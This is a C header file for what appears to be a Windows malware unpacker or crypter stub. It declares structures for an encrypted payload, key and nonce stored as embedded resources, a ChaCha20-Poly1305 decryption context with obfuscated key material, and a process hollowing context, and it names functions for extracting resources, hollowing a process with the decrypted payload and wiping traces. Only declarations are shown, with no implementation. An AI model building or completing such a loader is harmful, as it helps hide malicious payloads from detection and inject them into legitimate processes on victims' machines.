#ifndef UNPACKER_H
#define UNPACKER_H

#include <stdint.h>
#include <stdbool.h>
#include <windows.h>
#include "crypto/hashing/sha.h"
#include "crypto/chacha20-poly1305/chacha20poly1305.h"


#define PAYLOAD_RESOURCE_ID 132
#define KEY_RESOURCE_ID 133
#define NONCE_RESOURCE_ID 134
#define KEY_SIZE 32
#define NONCE_SIZE 24
#define METANONCE_SIZE 24
#define SALT_SIZE 16
#define OKM_SIZE 80

/**
 * @brief Holds cryptographic context and derived keys for unpacking.
 */
typedef struct
{
    uint8_t key[KEY_SIZE];
    uint8_t nonce[NONCE_SIZE];
    uint8_t hash[SHA256HashSize];
    uint8_t salt[SALT_SIZE];
    uint8_t prk[USHAMaxHashSize];
    uint8_t okm[OKM_SIZE];
    uint8_t metaNonce[METANONCE_SIZE];
    uint8_t obfKey[KEY_SIZE];
    uint8_t obfNonce[NONCE_SIZE];
}   CryptoContext;

/**
 * @brief Holds pointers and sizes for embedded resources.
 */
typedef struct
{
    unsigned char* payload;
    unsigned char* key;
    unsigned char* nonce;
    unsigned long payloadSize;
    unsigned long keySize;
    unsigned long nonceSize;
}   Resources;

/**
 * @brief Holds process hollowing context.
 */
typedef struct
{
    void* pe;
    void* pImageBase;
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;
    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;
    CONTEXT* CTX;
    char currentFilePath[MAX_PATH];
}   ProcessContext;


/**
 * @brief Extracts an embedded resource from the executable.
 */
static unsigned char* GetResource(int resourceId, char* resourceType, unsigned long* dwSize);

/**
 * @brief Performs process hollowing with the decrypted payload.
 */
static int ProcessHollowing(uint8_t* decrypted, unsigned long payloadSize);

/**
 * @brief Securely cleans up resources and sensitive data.
 */
static void CleanupResources(Resources* res, CryptoContext* crypto, uint8_t* decrypted, unsigned long payloadSize);

#endif /* UNPACKER_H */
